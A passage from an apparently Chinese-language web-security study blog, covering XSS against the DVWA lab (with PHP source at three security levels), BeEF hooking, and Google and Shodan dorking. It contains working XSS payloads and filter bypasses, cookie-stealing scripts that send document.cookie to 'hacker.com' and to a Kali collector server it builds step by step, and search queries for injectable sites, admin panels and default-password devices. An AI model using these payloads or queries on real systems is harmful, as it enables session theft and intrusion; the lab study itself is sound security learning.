class="name">SCRipt</span>&gt;</span></span><br><span class="line"># 字符编码 采用URL、Base64等编码 </span><br><span class="line"># 将 javascript:alert(&#x27;xss&#x27;); 转码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span>&quot;</span>&gt;</span>嘿嘿<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 收集用户cookie</span><br><span class="line"># 打开新窗口并且采用本地cookie访问目标网页</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&quot;http://www/hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookies</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>;</span></span><br><span class="line">img.width = 0;</span><br><span class="line">img.height = 0;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="反射型-xss-xss-reflected">反射型 XSS (XSS reflected)</h2>
<p>搜索框，用户提交恶意代码被执行</p>
<ul>
<li><p>low security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!array_key_exists (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>代码直接引用了 name 参数，并没有任何的过滤和检查</p></li>
<li><p>手工 XSS：用户访问网页中的 XSS 链接，服务器接受并返回，用户执行反射回来的代码并解析执行</p></li>
<li><p>首先在输入框中输入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，然后把此时的 URL(<code>http://192.168.50.129/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss+attack%27%29%3C%2Fscript%3E#</code>)给任何一个机器，该机器点开链接都能触发 XSS 攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">弹窗警告；页面重定向；...</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>medium security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!array_key_exists (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . str_replace(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>对输入进行了过滤，基于黑名单的思想，使用 str_replace 函数将输入中的<code>&lt;script&gt;</code>删除，这种防护机制是可以被轻松绕过的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># 1. 大小写混淆绕过</span><br><span class="line"></span><br><span class="line"># 2. 双写绕过</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>high security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(!array_key_exists (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>php htmlspecialchars()：把预定义的字符( "&lt;" （小于）、"&gt;" （大于）、&amp; （和号）、" （双引号）、' （单引号）)转换为 HTML 实体</li>
</ul></li>
</ul>
<h2 id="存储型-xss-xss-stored">存储型 XSS (XSS stored)</h2>
<p>攻击者将带有 XSS 攻击的链接放在网页的某个页面，例如评论框等；用户访问此 XSS 链接并执行，由于存储型 XSS 能够攻击所有访问此页面的用户，所以危害非常大</p>
<p>留言板，用户访问网站即可触发</p>
<ul>
<li><p>low security</p>
<p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line"><span class="variable">$name</span>    = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = stripslashes(<span class="variable">$message</span>);</span><br><span class="line"><span class="variable">$message</span> = mysql_real_escape_string(<span class="variable">$message</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = mysql_real_escape_string(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>输入用户名 1111，密码为<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，然后任何一个机器点击页面的 XSS restored 都会触发 XSS 攻击
<ul>
<li>获取 cookie：渗透机 Kali Linux 操作；肉鸡 windows</li>
</ul>
<ol type="1">
<li><p>构建收集 cookie 服务器</p>
<p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start apache2</span><br><span class="line">    </span><br><span class="line">vim /var/www/html/cookie_rec.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>,<span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$log</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">chown -R www-data.www-data /var/www/</span><br></pre></td></tr></table></figure></p></li>
<li><p>构造 XSS 代码并植入到 web 服务器</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 通过渗透机植入XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://192.168.50.128/cookie_rec.php?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"># 注：IP为Kali Linux的IP</span><br><span class="line"># 注：先清除之前植入的XSS代码 -&gt; dvwa Setup</span><br><span class="line"># 前端有限制，F12，修改前端的maxlength</span><br></pre></td></tr></table></figure></li>
</ol></li>
</ul>
<ol start="3" type="1">
<li><p>等待肉鸡触发 XSS 代码并将 cookie 发送至 Kali</p>
<p><img src="storexss-cookie-byhand.gif" alt="storexss-cookie-byhand" style="zoom:80%;" /></p></li>
<li><p>cookie 利用</p></li>
</ol></li>
<li><p>medium security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$message</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line">   <span class="variable">$name</span>    = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize message input</span></span><br><span class="line">   <span class="variable">$message</span> = trim(strip_tags(addslashes(<span class="variable">$message</span>)));</span><br><span class="line">   <span class="variable">$message</span> = mysql_real_escape_string(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = htmlspecialchars(<span class="variable">$message</span>);</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// Sanitize name input</span></span><br><span class="line">   <span class="variable">$name</span> = str_replace(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">   <span class="variable">$name</span> = mysql_real_escape_string(<span class="variable">$name</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$result</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<code>&lt;b&gt;</code>标签</p></li>
<li><p>对 message 参数使用了 htmlspecialchars 函数进行编码，无法再通过 message 参数注入 XSS 代码，但是对于 name 参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的 XSS</p></li>
<li><p>抓包改 name 参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 双写绕过 &lt;sc&lt;script&gt;ript&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="number">2.</span> 大小写混淆绕过 &lt;Script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>high security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$message</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line">   <span class="variable">$name</span>    = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize message input</span></span><br><span class="line">   <span class="variable">$message</span> = stripslashes(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = mysql_real_escape_string(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = htmlspecialchars(<span class="variable">$message</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize name input</span></span><br><span class="line">   <span class="variable">$name</span> = stripslashes(<span class="variable">$name</span>);</span><br><span class="line">   <span class="variable">$name</span> = mysql_real_escape_string(<span class="variable">$name</span>); </span><br><span class="line">   <span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$result</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>无法?</li>
<li>要注意的是，如果 htmlspecialchars 函数使用不当，攻击者就可以通过编码的方式绕过函数进行 XSS 注入，尤其是 DOM 型的 XSS</li>
</ul></li>
</ul>
<hr />
<h2 id="dom-型-xss">DOM 型 XSS</h2>
<p>基于文档对象模型（Document Objeet Model，DOM）</p>
<p>例如服务器端经常使用 document.boby.innerHtml 等函数动态生成 html 页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生 DOM 型的 XSS</p>
<p>DOM 型 XSS 可能是存储型，也有可能是反射型</p>
<hr />
<h2 id="自动化-xss">自动化 XSS</h2>
<h3 id="beef-简介">BeEF 简介</h3>
<blockquote>
<p>Browser Exploitation Framework (BeEF)</p>
<p>BeEF 是目前最强大的浏览器开源渗透测试框架，通过 XSS 漏洞配合 JS 脚本和 Metasploit 进行渗透</p>
<p>BeEF 是基于 Ruby 语言编写的，并且支持图形化界面，操作简单</p>
<p>http://beefproject.com/</p>
<p>信息收集：</p>
<ol type="1">
<li>网络发现</li>
<li>主机信息</li>
<li>cookie 获取</li>
<li>会话劫持</li>
<li>键盘记录</li>
<li>插件信息</li>
</ol>
<p>持久化控制：</p>
<ol type="1">
<li>确认弹框</li>
<li>小窗口</li>
<li>中间人</li>
</ol>
<p>社会工程：</p>
<ol type="1">
<li>点击劫持</li>
<li>弹窗告警</li>
<li>虚假页面</li>
<li>钓鱼页面</li>
</ol>
<p>渗透攻击：</p>
<ol type="1">
<li>内网渗透</li>
<li>Metasploit</li>
<li>CSRF 攻击</li>
<li>DDOS 攻击</li>
</ol>
</blockquote>
<h3 id="beef-基础">BeEF 基础</h3>
<ul>
<li><p>启动 Apache 和 BeEF</p>
<p>自带 BeEF 的 kali 版本：kali 2019.2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service apache2 start </span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击左侧🐂的图标</span></span><br><span class="line">ss -tnlp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要修改密码路径才能使用</span></span><br><span class="line"><span class="comment"># 修改BeEF的默认密码为1234</span></span><br><span class="line">root@kali:~<span class="comment"># vi /etc/beef-xss/config.yaml</span></span><br></pre></td></tr></table></figure></li>
<li><p>登录 BeEF：username：beef；password：beef(填写修改过的)</p>
<p><img src="beef-start.png" alt="image-20200812181307351" style="zoom:80%;" /></p></li>
<li><p>渗透机将脚本放在 DVWA 靶机中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.50.132:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># IP地址即BeEF所在机器</span><br><span class="line"># 需修改字符数的限制</span><br></pre></td></tr></table></figure>
<p><img src="beef-xss.png" alt="image-20200812181821108" style="zoom:80%;" /></p></li>
<li><p>BeEF 页面查看肉鸡是否上线</p>
<p><img src="beef-machine.png" alt="image-20200812182141380" style="zoom:80%;" /></p></li>
</ul>
<h3 id="信息收集">信息收集</h3>
<ul>
<li><p>Current Browser -&gt; Details</p>
<p><img src="beef-details.png" alt="image-20200812182348815" style="zoom:80%;" /></p></li>
<li><p>Commands -&gt; Browser -&gt; Hooked Domain -&gt; Get Cookie -&gt; Execute</p>
<blockquote>
<p>命令颜色(Color)：</p>
<p>绿色 对目标主机生效并且不可见(不会被发现)</p>
<p>橙色 对目标主机生效但可能可见(可能被发现)</p>
<p>灰色 对目标主机未必生效(可验证下)</p>
<p>红色 对目标主机不生效</p>
</blockquote></li>
<li><p>持久化控制</p></li>
<li><p>社会工程</p></li>
</ul>
<p>参考资料</p>
<ul>
<li>https://www.freebuf.com/articles/web/123779.html</li>
</ul>
<hr />
<h1 id="web-信息收集">Web 信息收集</h1>
<p>信息收集概述</p>
<blockquote>
<ol type="1">
<li>Web 信息搜集(探测)即 Web 踩点，主要是掌握目标 Web 服务的方方面面，是实现 Web 渗透入侵前的准备工作</li>
<li>Web 踩点内容包括操作系统(Windows/Linux)、服务器类型、数据库类型、Web 容器(Web 服务器：Tomcat/Nginx/Apache)、Web 语言(php/java)、域名信息(主站、子站、没有上线的域名)、网站目录...</li>
<li>Web 信息搜集涉及搜索引擎(谷歌、撒旦、钟馗之眼)、网站扫描、域名遍历、指纹识别等工作</li>
</ol>
</blockquote>
<h2 id="搜索引擎篇">搜索引擎篇</h2>
<h3 id="google-hacking">Google Hacking</h3>
<p>通过谷歌搜索想要的信息</p>
<h4 id="关键字">关键字</h4>
<ul>
<li><p>site</p>
<p>功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">site:zhihu.com</span><br><span class="line"># 搜索跟zhihu.com相关的网页</span><br><span class="line"></span><br><span class="line">&quot;web安全&quot; site:zhihu.com</span><br><span class="line">site:zhihu.com &quot;web安全&quot;</span><br><span class="line"># 可多个关键词</span><br><span class="line"># 关键词通过双引号当成一个整体来看</span><br><span class="line"># 搜索zhihu.com跟“web安全”相关的网页</span><br><span class="line"></span><br><span class="line">&quot;教程&quot; site:pan.baidu.com</span><br><span class="line"># 在百度网盘中搜索“教程”</span><br></pre></td></tr></table></figure></li>
<li><p>filetype</p>
<p>功能：搜索指定文件类型</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;web安全&quot; filetype:pdf</span><br><span class="line"># 搜索跟“web安全”相关的pdf文件</span><br><span class="line"></span><br><span class="line">nmap filetype:ppt</span><br><span class="line"># 搜索跟nmap相关的ppt文件</span><br><span class="line"></span><br><span class="line">site:csdn.net filetype:pdf</span><br><span class="line">filetype:pdf site:csdn.net</span><br><span class="line"># 搜索csdn网站中的pdf文件</span><br><span class="line"></span><br><span class="line">site:csdn.net filetype:pdf &quot;CC攻击&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>inurl</p>
<p>功能：搜索 url 网址存在特定关键字的网页，可以用来搜寻有注入点的网站</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">inurl:.php?id=</span><br><span class="line"># 搜索网址中有&quot;.php?id&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl:view.php=?</span><br><span class="line"># 搜索网址中有&quot;view.php=&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl:.jsp?id=</span><br><span class="line"># 搜索网址中有&quot;.jsp?id&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl:.asp?id=</span><br><span class="line"># 搜索网址中有&quot;.asp?id&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl: /admin/login.php</span><br><span class="line"># 搜索网址中有&quot;/admin/login.php&quot;的网页</span><br><span class="line"></span><br><span class="line">inurl:login</span><br><span class="line"># 搜索网址中有&quot;login&quot;等登录网页</span><br></pre></td></tr></table></figure></li>
<li><p>intitle</p>
<p>功能：搜索标题(也包括一些正文)存在特定关键字的网页</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">intitle:后台登录</span><br><span class="line"># 搜索网页标题是”后台登录“的相关网页</span><br><span class="line"></span><br><span class="line">intitle:后台管理 filetype:php</span><br><span class="line"># 搜索网页标题是”后台管理“的php页面</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;keyword&quot;</span><br><span class="line"># 搜索此关键字相关的索引目录信息</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;parent directory&quot;</span><br><span class="line"># 搜索根目录相关的索引目录信息</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;password&quot;</span><br><span class="line"># 搜索密码相关的索引目录信息</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;login&quot;</span><br><span class="line"># 搜索索引目录中的登录页面信息</span><br><span class="line"></span><br><span class="line">intitle:index of &quot;admin&quot;</span><br><span class="line"># 搜索索引目录中后台管理页面信息</span><br></pre></td></tr></table></figure></li>
<li><p>intext</p>
<p>功能：搜索正文存在特定关键字的网页</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">intext:Powered by Discuz</span><br><span class="line"># 搜索Discuz论坛相关的页面</span><br><span class="line"></span><br><span class="line">intext:powered by wordpress</span><br><span class="line"># 搜索wordpress制作的博客网址</span><br><span class="line"></span><br><span class="line">intext:powered by *CMS</span><br><span class="line"># 搜索*CMS相关的页面</span><br><span class="line"></span><br><span class="line">intext:Powered by xxx inurl:login</span><br><span class="line"># 搜索此类网址的后台登录页面</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="实例">实例</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 搜索美剧/电影等相关网站：</span><br><span class="line">inurl:php?id= intitle:美剧</span><br><span class="line">inurl:php?id= intitle:美女</span><br><span class="line">inurl:php?id  intitle:美女图片 intext:powered by discuz</span><br><span class="line">inurl:php?id  intitle:美女图片 intext:powered by *cms</span><br><span class="line"></span><br><span class="line"># 搜索用Discuz搭建的论坛：</span><br><span class="line">inurl:php?id intitle:电影 intext:powered by discuz</span><br><span class="line">intext:&quot;powered by discuz! 7.2&quot; inurl:faq.php intitle:论坛</span><br><span class="line"></span><br><span class="line"># 搜索使用Structs的相关网站：</span><br><span class="line">intitle:&quot;Structs Problem Report&quot;</span><br><span class="line">intitle:&quot;Structs Problem Report&quot; intext:&quot;development mode is enabled.&quot;</span><br></pre></td></tr></table></figure>
<h4 id="符号">符号</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">-keyword   强制结果不要出现此关键词，例如：电影 -黑客</span><br><span class="line">*keyword   模糊搜索，强制结果包含此关键词，例如：电影 一个叫*决定*</span><br><span class="line">&quot;keyword&quot;  强制搜索结果出现此关键词，例如：书籍 &quot;web安全&quot;</span><br><span class="line">~keyword   同时搜索keyword的近义词(比如college和university)</span><br><span class="line">2008..2012 ..显示文章内容含有指定年份时间段内的搜索结果</span><br></pre></td></tr></table></figure>
<h4 id="参考">参考</h4>
<p>Get More Out of Google - 有效利用谷歌搜索</p>
<ul>
<li><p>善于用搜索符</p></li>
<li><p>不要问谷歌问题</p>
<ul>
<li><p>比如需要一份燕子飞行速度的专业报告，燕子的飞行速度是多少[错误问法]，而是<code>filetype:pdf air speed intitle:velocity of *swallow</code></p></li>
<li><p>搜索作者 Dr. Ronald L. Green 和 Dr.Thomas P. Buttz. 关于光合作用的论文</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">author:green photosynthesis &quot;tp buttz&quot;</span><br><span class="line"># 搜索Green发表的论文</span><br><span class="line"># photosynthesis是普通的谷歌搜索，要找的主题关键字</span><br><span class="line"># &quot;&quot;让结果更精确，输入作者全名或者是缩写</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>定词定义：<code>define:angary</code></p></li>
<li><p>数学计算：直接在谷歌里输入数学算式，可包含+-*/和括号</p></li>
<li><p>单位换算：54 磅=？公斤</p></li>
<li><p>快捷键：</p>
<ul>
<li>Ctrl+L：选中浏览器地址栏</li>
</ul></li>
</ul>
<h3 id="shodan-hacking">Shodan Hacking</h3>
<blockquote>
<p>https://www.shodan.io/</p>
<p>Shodan(撒旦搜索引擎)是由 Web 工程师 John Matherly(马瑟利)编写的，被称为“最可怕的搜索引擎”，可扫描一切的互联网设备，如常见的 web 服务器、防火墙、路由器、交换机、摄像头、打印机等一切联网设备</p>
</blockquote>
<h4 id="关键词">关键词</h4>
<ul>
<li><p>ip</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">114.114.114.114</span><br><span class="line"># 直接在搜索框中输入上述语句</span><br></pre></td></tr></table></figure></li>
<li><p>service / protocol</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http</span><br><span class="line"># 所有提供http服务的主机</span><br><span class="line">http country:&quot;DE&quot;</span><br><span class="line">http country:&quot;DE&quot; product:&quot;Apache httpd&quot;</span><br><span class="line">http product:&quot;Apache httpd&quot;</span><br><span class="line"></span><br><span class="line">ssh</span><br><span class="line">ssh default password</span><br><span class="line">ssh default password country:&quot;JP&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>keyword</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 基于关键词搜索的思路是根据banner信息(设备指纹)来搜索</span><br><span class="line">&quot;default password&quot; country:&quot;TH&quot;</span><br><span class="line">FTP anon successful</span><br></pre></td></tr></table></figure></li>
<li><p>country</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">country:cn</span><br><span class="line">country:us</span><br><span class="line">country:jp</span><br></pre></td></tr></table></figure></li>
<li><p>product 产品</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">product:&quot;Microsoft IIS httpd&quot;</span><br><span class="line">product:&quot;nginx&quot;</span><br><span class="line">product:&quot;Apache httpd&quot;</span><br><span class="line">product:MySQL</span><br></pre></td></tr></table></figure></li>
<li><p>version</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">product:MySQL version:&quot;5.1.73&quot;</span><br><span class="line">product:&quot;Microsoft IIS httpd&quot; version:&quot;7.5&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>hostname</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">hostname:.org</span><br><span class="line">hostname:.edu</span><br><span class="line">hostname:www.baidu.com</span><br></pre></td></tr></table></figure></li>
<li><p>os</p>
